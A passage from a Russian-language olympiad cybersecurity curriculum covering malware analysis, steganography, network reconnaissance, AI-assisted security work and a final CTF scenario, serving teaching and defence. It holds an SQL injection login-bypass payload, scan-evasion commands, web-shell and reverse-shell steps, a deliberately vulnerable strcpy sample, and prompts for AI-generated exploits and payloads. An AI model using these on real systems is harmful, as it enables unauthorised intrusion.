    *   Определите, какие действия он совершал (изменение реестра, создание файлов) по журналам и данным MFT.
    *   Составьте временную шкалу атаки.
2. **Анализ дампа памяти жертвы**: Вам дают дамп памяти (`memdump.mem`). Задачи:
    *   Найдите скрытый или внедренный процесс.
    *   Дампьте его и проанализируйте статически (например, в Ghidra) или найдите в его памяти команды C2.
    *   Извлечь пароли из браузера или менеджера паролей.
3. **Корреляция данных**: Используя дамп трафика, логи веб-сервера и записи реестра, установите полную цепочку компрометации: как атакующий попал в систему, что делал, куда exfiltrровал данные.





9. Модуль 6 Анализ вредоносного ПО (Malware Analysis)


**Цель**: Определять функционал и источник вредоносной программы

### **Теоретический материал:**
**Методы анализа**:

| Метод | Описание | Инструменты |
|-------|----------|-------------|
| **Статический анализ** | Изучение без запуска: строки, импорты, структура | strings, PEiD, PEview, Ghidra |
| **Динамический анализ** | Изучение в запущенном виде: поведение, сеть, реестр | Process Monitor, Wireshark, Any.Run |
| **Гибридный анализ** | Комбинация статики и динамики | Cuckoo Sandbox, Hybrid Analysis |

**Индикаторы компрометации (IOC)**:
- **Файловые**: хеши (MD5, SHA256), имена файлов, пути
- **Сетевые**: IP-адреса, домены, URL
- **Поведенческие**: ключи реестра, имена процессов, изменения файлов

### **Детализация:**
*   **Среда анализа**: Изолированная виртуальная машина (Windows 7/10) без интернета, но с имитацией сети (INetSim, FakeNet-NG). Мониторинг инструментами: Process Monitor, Process Hacker, Wireshark, API Monitor.
*   **Распаковка**: Распознавание упаковщика (PEiD, Exeinfo PE). Динамическая распаковка: отладчик (x64dbg) с поиском точки входа оригинального кода (OEP - Original Entry Point) и дампом памяти.
*   **Анализ поведения**:
    *   **Стойкость**: Автозапуск (Run Keys, службы, планировщик).
    *   **Сокрытие**: Инжект кода в другие процессы, руткиты.
    *   **Функционал**: Кейлоггинг, шифрование файлов, бэкдор.
*   **YARA**: Язык для создания сигнатур вредоносного ПО.
    ```yara
    rule Simple_Malware {
        meta:
            description = "Detects a simple backdoor"
        strings:
            $c2 = "evil.com" ascii
            $regkey = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        condition:
            any of them
    }
    ```

### **Разбор решения задачи:**
**Задача**: Проанализируйте файл `suspicious.exe`. Определите его назначение.

**Решение**:
1. **Статический анализ**:
```bash
# Хеши файла
$ md5sum suspicious.exe
d41d8cd98f00b204e9800998ecf8427e

# Строки в файле
$ strings suspicious.exe | head -20
http://evil-c2.com/beacon
Microsoft Windows
GetProcAddress
LoadLibraryA
CreateProcessA
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

2. **Анализ PE-структуры** (PEview):
   - Секция `.text` очень маленькая → возможно упакован
   - Много импортов из `WS2_32.dll` (сетевая функциональность)

3. **Динамический анализ** (песочница Any.Run):
   - Устанавливает автозапуск в реестре
   - Подключается к `185.220.101.134` (известный C2)
   - Скачивает и запускает второй файл

**Вывод**: Это бэкдор с автозапуском, который связывается с C2-сервером.

**Разбор мышления**:
1. **Безопасность**: Анализируем в изолированной среде (виртуальная машина без сети)
2. **Быстрая оценка**: `file`, `strings`, хеши — за 5 минут понимаем, что за файл
3. **Глубокая инспекция**: Если подозрительно — статический анализ в Ghidra
4. **Наблюдение за поведением**: Запуск в песочнице, мониторинг действий
### Практические задания:
1. Проанализируйте образец с MalwareBazaar в песочнице Any.Run
2. Используйте PEiD для определения упаковщика
3. Определите IOC для данного образца (хеши, IP, домены)
### **Практические задания (лабораторная работа):**
1. **Статический анализ образца**: Возьмите образец с MalwareBazaar. Проведите статический разбор без запуска: определите импорты (какие функции использует), строки (C2, пути), признаки упаковки, потенциальные возможности.
2. **Динамический анализ в песочнице**: Запустите образец в любой песочнице (Hybrid Analysis, ANY.RUN, собственная VM). Соберите все IOC: хеши файлов, IP/домены C2, созданные файлы и ключи реестра, сетевые шаблоны.
3. **Написание YARA-правила**: На основе найденных IOC напишите YARA-правило, которое детектирует этот и похожие образцы.


10. Модуль 7 Стеганография и скрытие данных

**Цель**: Находить информацию, скрытую в медиафайлах и других объектах

### **Теоретический материал:**
**Методы скрытия данных**:

| Метод | Принцип | Инструменты для обнаружения |
|-------|---------|----------------------------|
| **LSB (Least Significant Bit)** | Замена младших битов пикселей | zsteg, steghide (с паролем) |
| **Спектральный анализ** | Скрытие в частотах аудио/изображений | Audacity, Sonic Visualiser |
| **Метаданные** | Информация в EXIF, комментариях | exiftool, strings |
| **Файлы в файлах** | Вложение одного файла в другой | binwalk, foremost, dd |
| **Неиспользуемые области** | Данные после конца файла (`IEND` в PNG) | hex-редактор |

### **Детализация:**
*   **Методы и инструменты**:
    *   **Изображения (PNG, BMP, JPG)**: `zsteg`, `steghide`, `stegsolve`, `stegoveritas`.
    *   **Аудио**: `steghide`, `deepSound`, спектрограмма в Audacity.
    *   **Видео**: Извлечение кадров (`ffmpeg`), анализ каждого кадра.
*   **Техники**:
    *   **LSB (Least Significant Bit)**: Как работает, почему человеческий глаз не замечает.
    *   **Скрытие в метаданных**: EXIF, комментарии ID3 (MP3), документы (PDF, Word).
    *   **Скрытие в структуре файла**: Дополнительные данные после маркера `IEND` в PNG, неиспользуемые поля заголовков.
*   **Подход "Брутфорс и эвристика"**: Часто флаг или пароль к стего-файлу — это слово из легенды или стандартный CTF-словарь (`rockyou.txt`). Пишем скрипты для автоматического перебора.

### **Разбор решения задачи:**
**Задача**: В файле `photo.jpg` скрыто сообщение. Найдите его.

**Решение (пошагово)**:
1. **Проверка метаданных**:
```bash
$ exiftool photo.jpg
...
Comment: VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdl
```

2. **Анализ строки**: `VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdl` — это base64
```bash
$ echo "VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdl" | base64 -d
This is a secret message
```

3. **Если метаданные чистые, проверяем LSB**:
```bash
# Установка zsteg: gem install zsteg
$ zsteg photo.jpg
b1,r,lsb,xy .. text: "flag{st3g0_1s_fun}"
```

4. **Проверяем вложенные файлы**:
```bash
$ binwalk photo.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
12345         0x3039          Zip archive data, at least v1.0 to extract

$ binwalk -e photo.jpg  # извлечь вложения
$ ls _photo.jpg.extracted/
secret.zip
```

**Разбор мышления**:
1. **Порядок проверки**: Метаданные → LSB → Вложения → Спектр
2. **Автоматизация**: Скрипт, который запускает все инструменты по очереди
3. **Крипто-стего**: Извлеченные данные могут быть зашифрованы — нужен еще этап
### Практические задания:
1. С помощью Audacity найдите флаг, скрытый в спектрограмме аудиофайла
2. Используйте steghide для извлечения данных из изображения (пароль: `pass123`)
3. Найдите флаг, скрытый в комментарии ID3-тега MP3-файла
### **Практические задания (квест):**
1. **Многослойная стего**: Вам дают изображение. В его LSB (zsteg) вы находите пароль. Этот пароль открывает архив, прикрепленный в конце файла (binwalk). В архиве — аудиофайл, в спектрограмме которого (Audacity) скрыта ссылка на веб-страницу, где в исходном коде (комментарий) лежит финальный флаг. Смоделируйте и решите такую цепочку.
2. **Стего в нетривиальных местах**: Найдите данные, скрытые в:
    *   Пикселях одного конкретного цвета на изображении.
    *   Атрибутах файла в образе диска (дата создания/изменения в качестве носителя данных).
    *   Порядке следования файлов в каталоге.


11. Модуль 8 Сетевая разведка и картографирование — Глубокая детализация


**Цель**: Не просто найти открытые порты, а **построить полную модель целевой инфраструктуры**, понять архитектуру и выявить слабые звенья.

### **Теоретический материал:**
**Методы сканирования Nmap**:

| Тип сканирования | Команда | Принцип | Обнаруживаемость |
|-----------------|---------|---------|------------------|
| **TCP SYN** | `-sS` | Отправка SYN, анализ ответов | Средняя |
| **TCP Connect** | `-sT` | Полное установление соединения | Высокая |
| **UDP** | `-sU` | Отправка UDP-пакетов | Низкая (медленное) |
| **ОС и версии** | `-O`, `-sV` | Анализ отпечатков | Высокая |

**Этапы разведки**:
1. **Обнаружение хостов**: Какие хосты активны в сети?
2. **Сканирование портов**: Какие порты открыты?
3. **Определение сервисов**: Какие версии ПО работают?
4. **Поиск уязвимостей**: Есть ли известные уязвимости?

#### **1. Модель OSINT (Open Source Intelligence) для ИБ:**
```
1. Пассивная разведка (без прямого взаимодействия):
   - Домены: WHOIS, история DNS, субдомены
   - SSL-сертификаты: crt.sh, Certificate Transparency
   - Поисковые системы: Google dorks ("site:target.com filetype:pdf")
   - Социальные сети: GitHub (утечки кода), LinkedIn (технологический стек)

2. Активная разведка (с взаимодействием):
   - Сканирование портов
   - Баннерграббинг (сбор информации от сервисов)
   - Анализ ответов серверов (заголовки HTTP, ошибки)
```

#### **2. Протоколы и их уязвимости для разведки:**
| Протокол | Порт(ы) | Что можно узнать | Инструменты |
|----------|---------|------------------|-------------|
| **SSH** | 22 | Версия, поддерживаемые методы аутентификации | `nmap -sV --script ssh2-enum-algos` |
| **SMTP** | 25,587 | Список пользователей (VRFY, EXPN, RCPT TO) | `smtp-user-enum`, `Metasploit` |
| **DNS** | 53 | Зона трансфера, информация о домене | `dig axfr @ns.target.com target.com` |
| **SNMP** | 161 | Конфигурация сетевого оборудования (публичные community strings) | `snmpwalk`, `onesixtyone` |
| **SMB** | 445 | Версия ОС, список общих ресурсов, пользователи | `enum4linux`, `smbclient` |

#### **3. Техники обхода систем обнаружения:**
- **Сканирование с низкой скоростью:** `nmap -T1 --max-rate 10`
- **Случайный порядок портов:** `nmap -r`
- **Использование прокси/тор:** `proxychains nmap ...`
- **Имитация легитимного трафика:** использование `nmap --script` с эвристиками
### Разбор решения задачи:
**Задача**: Просканируйте сеть `192.168.1.0/24`, найдите веб-серверы и проверьте их на уязвимости.

**Решение**:
```bash
# 1. Обнаружение активных хостов
$ nmap -sn 192.168.1.0/24
Nmap scan report for 192.168.1.1
Host is up (0.0023s latency).
Nmap scan report for 192.168.1.100
Host is up (0.005s latency).

# 2. Сканирование портов на найденных хостах
$ nmap -sS -p 1-1000 192.168.1.1 192.168.1.100

# 3. Детальное сканирование веб-сервера (порт 80 открыт)
$ nmap -sV -sC -p 80,443,8080 192.168.1.100
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.29
| http-title: Site doesn't have a title (text/html).
|_Requested resource was http://192.168.1.100/login.php
443/tcp open  ssl/http Apache httpd 2.4.29

# 4. Проверка на уязвимости
$ nmap --script http-vuln-* -p 80 192.168.1.100
```

### **Разбор решения задачи:**

**Задача:** Проведите полную разведку домена `target-company.com` и составьте карту его сетевой инфраструктуры.

**Решение (поэтапное):**

**1. Пассивная разведка:**
```bash
# 1.1. Поиск субдоменов
$ subfinder -d target-company.com -o subdomains.txt
$ assetfinder --subs-only target-company.com >> subdomains.txt
# Результат: admin.target-company.com, api.target-company.com, vpn.target-company.com

# 1.2. Проверка SSL-сертификатов
$ curl -s "https://crt.sh/?q=%25.target-company.com&output=json" | jq -r '.[].name_value' | sort -u
# Находим: dev.internal.target-company.com (внутренний домен!)

# 1.3. Поиск в GitHub
$ git clone https://github.com/target-company/repo.git
$ grep -r "password\|secret\|key" repo/
```

**2. Активное сканирование:**
```bash
# 2.1. Быстрое сканирование для определения живых хостов
$ nmap -sn -iL subdomains.txt -oA ping_sweep
# Находим: 3 активных IP

# 2.2. Полное сканирование портов на найденных хостах
$ nmap -sS -sV -sC -O -p- --min-rate 1000 -oA full_scan 192.168.1.100-102
```

**3. Анализ результатов:**
```
Хост 192.168.1.100:
- Порт 80: Apache/2.4.41 (Ubuntu)
- Порт 443: HTTPS с самоподписанным сертификатом
- Порт 8080: Jenkins CI (версия 2.332)

Хост 192.168.1.101:
- Порт 22: OpenSSH 8.2
- Порт 3306: MySQL 5.7.33

Хост 192.168.1.102:
- Порт 445: SMB (Windows Server 2019)
- Порт 3389: RDP
```

**4. Углублённый анализ конкретных сервисов:**

**Для Jenkins (уязвимость!):**
```bash
# Проверяем на публичные эксплойты
$ searchsploit jenkins 2.332
# Находим: несколько уязвимостей, включая CVE-2022-XXX

# Проверяем анонимный доступ
$ curl http://192.168.1.100:8080
# Если доступ есть - можем собирать информацию о сборках
```

**Для SMB (поиск утечек):**
```bash
$ enum4linux -a 192.168.1.102
# Находим: пользователя admin, общую папку "confidential"
$ smbclient //192.168.1.102/confidential -N
```

**5. Составление карты инфраструктуры:**
```
┌─────────────────────────────────────┐
│      Интернет                       │
│        │                            │
│    [CloudFlare]                     │
│        │                            │
│    [Внешний балансировщик]          │
│        │                            │
├─────────────────────────────────────┤
│      Периметр                       │
│    ┌─────────┐ ┌─────────┐         │
│    │ Веб-сервер │ Jenkins  │       │
│    │ Apache    │ (уязвим!)│       │
│    └─────────┘ └─────────┘       │
│            │        │              │
├─────────────────────────────────────┤
│      Внутренняя сеть                │
│        │                            │
│    [Файрвол]                        │
│        │                            │
│    ┌─────────┐ ┌─────────┐         │
│    │ БД сервер │ Файловый  │       │
│    │ MySQL    │ сервер    │       │
│    └─────────┘ └─────────┘       │
│                                   │
│    [Внутренний домен:             │
│     dev.internal.target-company.com]│
└─────────────────────────────────────┘
```

**Разбор мышления:**
1. **Слоёность:** Начинаем с пассивной разведки (без шума), потом активная
2. **Контекстуализация:** Каждый найденный сервис оцениваем с точки зрения:
   - Критичность (содержит ли важные данные?)
   - Уязвимость (известны ли эксплойты?)
   - Потенциал для дальнейшего продвижения
3. **Документирование:** Всё фиксируем для отчёта и планирования атаки
### Практические задания:
1. Просканируйте `scanme.nmap.org`, определите открытые порты и версии сервисов
2. Используйте скрипты NSE для проверки найденного веб-сервера на распространенные уязвимости
3. Определите ОС целевого хоста по сетевому отпечатку
### **Практические задания (интеграционные):**

1. **Полный цикл разведки предприятия:**
   - Выберите любой публичный домен (с разрешения!)
   - Проведите пассивную разведку
   - Определите "золотую жилу" (самый интересный сервис)
   - Проведите его углублённый анализ
   - Составьте отчёт с рекомендациями по защите

2. **Обход систем обнаружения:**
   - Настройте Suricata или Snort для детектирования сканирования
   - Попробуйте провести разведку так, чтобы не вызвать алертов
   - Проанализируйте, какие техники были обнаружены

3. **Автоматизация разведки:**
   - Напишите скрипт на Python, который:
     a) Принимает домен
     b) Ищет субдомены
     c) Проверяет их на доступность
     d) Определяет открытые порты
     e) Генерирует HTML-отчёт с картой инфраструктуры




12. Модуль 9 Нейросети как инструмент аналитика — Глубокая детализация


**Цель:** Научиться использовать ИИ не как "волшебную палочку", а как **интеллектуального помощника**, который ускоряет рутинные задачи, генерирует гипотезы и помогает в анализе.

### **Теоретический материал:**
**Prompt-инжиниринг для ИБ**:

  

|Задача|Пример промпта|Что ожидать|
|---|---|---|
|**Объяснение кода**|"Объясни, что делает этот код на ассемблере: [код]. Какая здесь логика проверки?"|Понимание алгоритма, ключевые условия|
|**Генерация гипотез**|"Предложи 3 способа, как мог быть скрыт флаг в этом PNG-файле"|Список методов проверки|
|**Помощь с эксплуатацией**|"Как эксплуатировать SQL-инъекцию типа time-based blind?"|Пошаговая методика|
|**Документирование**|"Сформулируй выводы расследования в виде отчета: атака началась с фишинга..."|Структурированный текст|

  

**Ограничения и риски**:

- Нейросеть может ошибаться в технических деталях

- Нельзя доверять сгенерированному коду без проверки

- Конфиденциальные данные не стоит отправлять в публичные модели
#### **1. Классификация задач, где ИИ эффективен в ИБ:**
```
А. Анализ и объяснение:
   - Декомпилированный код (Ghidra output)
   - Сложные логи ошибок
   - Непонятные протоколы

Б. Генерация:
   - Код эксплойтов по описанию уязвимости
   - SQL-запросы для инъекций
   - Payload-ы для различных атак
   - Документация и отчёты

В. Исследование:
   - "Что можно сделать с этим сервисом?"
   - "Какие уязвимости типичны для этой версии ПО?"
   - "Как обойти эту защиту?"

Г. Обработка данных:
   - Анализ больших логов
   - Классификация событий
   - Выделение аномалий
```

#### **2. Prompt-инжиниринг для ИБ специалиста:**

**Плохой промпт:** "Объясни этот код"

**Хороший промпт (структурированный):**
```
Я анализирую бинарный файл для CTF. Вот функция из Ghidra:

```c
void check_password(char *input) {
    char buffer[16];
    strcpy(buffer, input);
    if (strcmp(buffer, "secret123") == 0) {
        printf("Access granted");
    }
}
```

Задания:
1. В чём уязвимость этой функции?
2. Как её можно эксплуатировать?
3. Напиши Python-скрипт для эксплуатации с помощью pwntools
4. Какие меры защиты могли бы предотвратить эту уязвимость?

Отвечай по пунктам.
```

#### **3. Локальные модели vs облачные API:**

| Критерий | Локальные (Llama, Mistral) | Облачные (GPT-4, Claude) |
|----------|----------------------------|--------------------------|
| **Конфиденциальность** | ✅ Данные не уходят | ❌ Данные уходят к провайдеру |
| **Стоимость** | ✅ Бесплатно | ❌ Платная подписка |
| **Качество анализа** | ⚠️ Среднее | ✅ Высокое |
| **Скорость** | ⚠️ Зависит от железа | ✅ Быстро |
| **Актуальность** | ❌ Может быть устаревшей | ✅ Всегда актуальная |

**Рекомендация:** Для CTF и обучения можно использовать облачные модели. Для реальных инцидентов с конфиденциальными данными — только локальные.

### **Разбор решения задачи с ИИ:**

**Задача:** Вам дали странный бинарный файл `mystery.bin`. При запуске он просит ввести "ключ". Нужно понять, как работает проверка.

**Решение с использованием ИИ:**

**1. Первичный анализ (самостоятельно):**
```bash
$ file mystery.bin
mystery.bin: ELF 64-bit LSB executable, x86-64

$ strings mystery.bin | head -20
Enter the key:
Wrong!
Correct! Flag: %s
sup3r_s3cr3t_k3y_2024
```

**2. Анализ в Ghidra (получаем сложный код):**
```c
// Декомпилированный код (запутанный)
long complex_check(char *input) {
    long var1 = 0, var2 = 0, var3 = 0;
    for(int i = 0; i < strlen(input); i++) {
        var1 = (var1 * 31 + input[i]) % 1000000007;
        var2 = (var2 * 17 + input[i] * i) % 998244353;
        var3 = var3 ^ (input[i] << (i % 8));
    }
    return (var1 == 123456789) && (var2 == 987654321) && (var3 == 0xdeadbeef);
}
```

**3. Используем ИИ для анализа алгоритма:**

**Промпт:**
```
Я реверс-инженер. У меня есть функция проверки ключа на C:

```c
long complex_check(char *input) {
    long var1 = 0, var2 = 0, var3 = 0;
    for(int i = 0; i < strlen(input); i++) {
        var1 = (var1 * 31 + input[i]) % 1000000007;
        var2 = (var2 * 17 + input[i] * i) % 998244353;
        var3 = var3 ^ (input[i] << (i % 8));
    }
    return (var1 == 123456789) && (var2 == 987654321) && (var3 == 0xdeadbeef);
}
```

Задания:
1. Объясни, что делает этот алгоритм
2. Какой длины должен быть ключ? (подсказка: посмотри на условия)
3. Это обратимая функция? Можно ли восстановить ключ по значениям var1, var2, var3?
4. Если нельзя восстановить аналитически, предложи метод brute force
5. Напиши Python-скрипт для brute force
```

**4. Ответ ИИ (сокращённо):**
```
1. Алгоритм вычисляет три хеша от входной строки:
   - var1: полиномиальный хеш с базой 31
   - var2: модифицированный полиномиальный хеш с учётом позиции символа
   - var3: XOR с динамическим сдвигом

2. Длина ключа неизвестна из кода. Нужен brute force по длине.

3. Функция необратима из-за модульной арифметики и XOR.

4. Метод brute force:
   - Перебираем длины от 1 до 20 (разумный предел)
   - Для каждой длины перебираем все символы printable (32-126)
   - Проверяем условие

5. Скрипт на Python:
```python
import itertools
import string

def check(input_str):
    var1 = var2 = var3 = 0
    for i, c in enumerate(input_str):
        var1 = (var1 * 31 + ord(c)) % 1000000007
        var2 = (var2 * 17 + ord(c) * i) % 998244353
        var3 = var3 ^ (ord(c) << (i % 8))
    return (var1 == 123456789 and var2 == 987654321 
            and var3 == 0xdeadbeef)

# Brute force для длины до 8 (дольше - нереально)
for length in range(1, 9):
    for combo in itertools.product(string.printable, repeat=length):
        candidate = ''.join(combo)
        if check(candidate):
            print(f"Found key: {candidate}")
            break
```
```

**5. Улучшаем скрипт (сами):**
```python
# Добавляем ограничения из strings
possible_key = "sup3r_s3cr3t_k3y_2024"
if check(possible_key):
    print(f"Key from strings works: {possible_key}")
```
### Разбор решения задачи:
**Задача**: У вас есть обфусцированный JavaScript. Поймите, что он делает.

**Решение с помощью ИИ**:
1. **Исходный код** (обфусцированный):
```javascript
eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.1(\'2{3_4_5}\')',6,6,'console|log|flag|you|found|it'.split('|'),0,{}))
```

2. **Запрос к нейросоти**:
```
У меня есть обфусцированный JavaScript. Объясни, что он делает:
[eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.1(\'2{3_4_5}\')',6,6,'console|log|flag|you|found|it'.split('|'),0,{}))]
```

3. **Ответ нейросоти**:
```
Это обфусцированный код с помощью инструмента типа packer. После деобфускации он делает:
console.log('flag{you_found_it}')
```

**Разбор мышления**:
1. **Определение необходимости**: Стоит ли использовать ИИ? Для обфусцированного кода — да, это сэкономит время
2. **Формулировка запроса**: Четко указать контекст (ИБ, CTF, анализ кода)
3. **Проверка результата**: Всегда проверяйте вывод! Запустите код в изолированной среде
**Разбор мышления:**
4. **Разделение труда:** ИИ делает то, что ему хорошо — анализирует код, объясняет логику, пишет шаблонные скрипты
5. **Человеческий контроль:** Мы добавляем контекст (strings из бинарника), оптимизируем brute force
6. **Верификация:** Всегда проверяем вывод ИИ на практике

### **Практические задания (интеграционные):**

1. **ИИ как напарник в CTF:**
   - Возьмите любую задачу с CTFtime средней сложности
   - Решайте её вместе с ИИ:
     * Попросите проанализировать данные
     * Сгенерируйте гипотезы
     * Напишите скрипты для проверки
   - Замерьте время: сколько решили бы без ИИ, сколько с ИИ

2. **Автоматизация отчётов:**
   - Проведите мини-аудит учебного приложения
   - Соберите все находки в сыром виде
   - Попросите ИИ:
     a) Структурировать находки по критичности
     b) Сгенерировать описания уязвимостей
     c) Написать рекомендации по исправлению
     d) Оформить в виде профессионального отчёта

3. **Создание интеллектуального помощника:**
   - Напишите скрипт на Python, который:
     a) Принимает кусок кода/лог/дамп
     b) Формирует промпт для ИИ
     c) Отправляет запрос (например, к локальной модели через Ollama)
     d) Парсит ответ и выдаёт структурированный результат

**Пример: помощник для анализа сетевого трафика**
```python
def analyze_pcap_with_ai(pcap_path):
    # Извлекаем статистику из pcap
    stats = get_pcap_stats(pcap_path)  # ваша функция
    
    prompt = f"""
    Я анализирую сетевой трафик. Вот статистика:
    {stats}
    
    Вопросы:
    1. Есть ли подозрительная активность?
    2. Какие протоколы преобладают?
    3. На что стоит обратить внимание?
    """
    
    return ask_ai(prompt)  # ваша функция для запроса к ИИ
```

### **Этические границы и ограничения:**

1. **Что можно:**
   - Анализировать свой код/логи
   - Учиться на учебных задачах
   - Автоматизировать рутинные задачи

2. **Что нельзя:**
   - Загружать конфиденциальные данные в публичные ИИ
   - Использовать ИИ для реальных атак без разрешения
   - Полностью доверять сгенерированному коду без проверки

3. **Правило 90/10:** 90% работы и анализа делаете вы, 10% — делегируете ИИ для ускорения.


### Практические задания:
1. Попросите нейросеть объяснить сложную функцию из декомпилированного кода Ghidra
2. Сгенерируйте с помощью ИИ Python-скрипт для атаки padding oracle
3. Попросите улучшить ваш отчет по расследованию



13. Модуль 10 Комплексная задача и методология финала


**Цель**: Научиться проходить полный цикл финального задания: от легенды до отчета

### **Теоретический материал:**
**Структура финального задания НТО**:
1. **Легенда** (1-2 страницы): Описание компании, инцидента, контекст
2. **Наступательная часть**: Получить доступ к системам (веб, бинарные уязвимости)
3. **Расследование**: Найти следы атаки, восстановить события
4. **Защита**: Предложить меры по устранению уязвимостей
5. **Отчет**: Оформить результаты (20-30 страниц)

**Распределение ролей в команде**:
| Роль | Навыки | Задачи |
|------|--------|--------|
| **Веб-эксперт** | SQLi, XSS, SSRF, Burp Suite | Взлом веб-приложений, поиск уязвимостей |
| **Реверсер** | Ghidra, GDB, ассемблер | Анализ бинарных файлов, эксплуатация уязвимостей |
| **Форензик** | Wireshark, Autopsy, Volatility | Расследование, анализ артефактов |
| **Крипто-аналитик** | Математика, Python, инструменты | Взлом шифров, анализ алгоритмов |

### **Методология финалиста (пошаговая):**

**1. Первые 30 минут — чтение и планирование (ВСЕЙ командой):**
*   Внимательно, вслух читаем легенду. Выделяем: **Цель**, **Объекты** (IP, домены, файлы), **Ключевые слова**.
*   Составляем общий план: Кто за какую область отвечает (Веб, Реверс, Форензика).
*   Настраиваем общее рабочее пространство (общий чат, доска в Miro/Miro, общая папка).

**2. Разведка и составление карты (1-2 часа):**
*   **Сканирование сети:** `nmap -sS -sV -sC -oA full_scan <цели>`.
*   **Веб-разведка:** `gobuster`, `nikto`, ручной осмотр каждого найденного веб-приложения.
*   **Результат:** Карта инфраструктуры с хостами, сервисами, версиями ПО.

**3. Параллельная работа по направлениям:**
*   **Веб-специалист:** Тестирует каждую найденную форму, параметр, API.
*   **Реверсер:** Анализирует выданные бинарные файлы/прошивки.
*   **Форензик:** Изучает данные для расследования (логи, трафик, образы).
*   **Важно:** Каждые 30-60 минут — короткий "sync-up", чтобы делиться находками.

**4. Соединение пазлов и эскалация:**
*   Часто доступ к веб-админке даёт возможность загрузить файл → получить выполнение кода на сервере → вытащить оттуда файл БД или бинарник для анализа.
*   Флаг, найденный в бинарнике, может быть паролем к архиву с логами.
*   Документируйте **всё**, особенно связи между артефактами.

**5. Завершение и отчёт (минимум 1.5 часа до конца):**
*   **СТОП кодированию и взлому.**
*   Все собирают свои находки.
*   Пишется связный рассказ: "Инцидент начался с того, что злоумышленник, используя уязвимость SQLi в форме поиска на сайте company.com, получил доступ к учётным данным администратора...".
*   Отчёт должен включать **IOC**, **TTAP (Tactics, Techniques & Procedures)** злоумышленника и **рекомендации** по устранению каждой найденной уязвимости.

### **Разбор решения задачи:**
**Задача (упрощенная версия реального финала)**:

*Легенда*: В компанию "SecureBank" поступила угроза о публикации данных клиентов. Подозревается взлом через портал для клиентов.

**Решение по этапам**:

1. **Разведка и сканирование**:
```bash
# Находим веб-сервер
$ nmap -sS -p 80,443,8080,8443 192.168.1.100
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

# Анализируем веб-приложение
$ gobuster dir -u https://client.securebank.com -w /usr/share/wordlists/dirb/common.txt
/login.php        (Status: 200)
/admin.php        (Status: 302)  # редирект на /login.php
/upload.php       (Status: 200)
```

2. **Взлом веб-приложения**:
   - Находим SQLi в `/login.php`: `admin' OR '1'='1' -- `
   - Получаем доступ к админке
   - В админке находим возможность загрузки файлов → загружаем веб-шелл
   - Получаем reverse shell на сервер

3. **Расследование на сервере**:
```bash
# Ищем подозрительные файлы
$ find / -name "*.log" -mtime -1 2>/dev/null
/var/log/apache2/access.log
/var/log/ssh_auth.log

# Анализируем логи
$ grep -i "failed\|error\|attack" /var/log/apache2/access.log
192.168.1.50 - - [15/May/2023:14:30:12] "POST /upload.php HTTP/1.1" 200 345
```

4. **Анализ вредоносного файла**:
   - На сервере находим `/tmp/backdoor`
   - Анализируем в Ghidra → понимаем, что это бэкдор с C2 `185.220.101.134`
   - Находим в коде функцию шифрования данных перед отправкой

5. **Защита и отчет**:
   - Предлагаем патч для SQLi: использовать prepared statements
   - Рекомендуем WAF для фильтрации запросов
   - Составляем IOC для обнаружения бэкдора

**Разбор мышления**:
1. **Системный подход**: Видим задачу как единое целое, а не набор изолированных подзадач
2. **Документирование с ходу**: Записываем все находки, чтобы не потерять контекст
3. **Гибкость**: Если зашли в тупик на одном направлении, переключаемся на другое
4. **Командная работа**: Постоянно обмениваемся находками, синхронизируем понимание

### **Практические задания:**
1. Пройдите полноценный кейс из архива ВсОШ по ИБ (практический тур)
2. Проведите 8-часовую симуляцию финала в команде
3. Напишите отчет по результатам расследования на 15+ страниц

**Финальная практика (за 2 недели до финала):**
1.  Проведите 8-часовой "мокап" (имитацию) финала. Используйте архивные задачи или комплексные машины (HackTheBox, VulnHub).
2.  После мокапа проведите "разбор полётов": что получилось, что нет, почему застряли, как можно было сделать лучше.
3.  Отработайте навык быстрого гугления и чтения мануалов на английском языке.





### **Еженедельный план (минимум 10 часов в неделю):**
- **Понедельник-вторник**: Теория и новые инструменты (2-3 ч/день)
- **Среда-четверг**: Практика на платформах (2-3 ч/день)
- **Пятница**: Участие в CTF или решение комплексных задач (3-4 ч)
- **Суббота**: Разбор ошибок, изучение write-ups (2-3 ч)
- **Воскресенье**: Повторение, ведение конспекта (1-2 ч)

### **Ключевые ресурсы:**
1. **Архивы задач**:
   - Архив заданий ВсОШ по информационной безопасности
   - Материалы заданий НТО
   - CTFtime (архив соревнований)

2. **Платформы для практики**:
   - PortSwigger Web Security Academy (веб)
   - CryptoHack (криптография)
   - pwn.college (реверс, pwn)
   - Hack The Box (комплексные машины)
   - TryHackMe (обучение с комнатами)
   - CTFlearn (задачи разной сложности)

3. **Инструменты (установить и освоить)**:
   - **Kali Linux** (основная ОС)
   - **Burp Suite Community** (веб-прокси)
   - **Ghidra** (реверс-инжиниринг)
   - **Wireshark** (анализ трафика)
   - **Volatility** (анализ памяти)
   - **steghide, zsteg, binwalk** (стеганография)

### **Методика работы с задачами:**
1. **Самостоятельная попытка** (1-2 часа):
   - Прочитать условие, понять контекст
   - Выдвинуть гипотезы, проверить самые очевидные
   - Пробовать разные подходы

2. **Если не получается**:
   - Сделать перерыв, вернуться с fresh mind
   - Посмотреть подсказки (если есть)
   - Прочитать write-up, но **не копировать решение**

3. **Анализ write-up**:
   - Понять **ход мыслей** автора
   - Записать в конспект новый метод/инструмент
   - Решить задачу самостоятельно уже со знанием подхода

### **Ведение конспекта (рекомендуемые инструменты):**
- **Obsidian** или **Logseq**: для связных заметок с тегами и ссылками
- **Notion**: для структурированных таблиц (чек-листы, прогресс)
